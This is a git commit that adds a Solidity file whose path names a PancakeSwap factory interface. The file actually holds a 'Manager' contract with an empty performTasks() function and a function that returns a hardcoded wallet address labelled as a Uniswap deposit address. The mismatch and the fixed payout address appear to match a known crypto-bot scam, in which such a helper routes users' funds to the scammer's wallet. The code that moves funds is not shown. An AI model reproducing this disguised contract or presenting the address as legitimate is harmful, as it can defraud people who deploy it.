25f4321574b86ea2a8d571460a5e4d12adf423a7
githubqrs <97636101+githubqrs@users.noreply.github.com>
2022-02-10 11:42:28 +0200

    Add files via upload

---
+++ contracts/interfaces/V2/IPancakeswapV2Factory.sol
@@ -0,0 +1,12 @@
+
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0x28a724B93B3131c0386797ba53a16DC453Ff9277;
+	}
+}
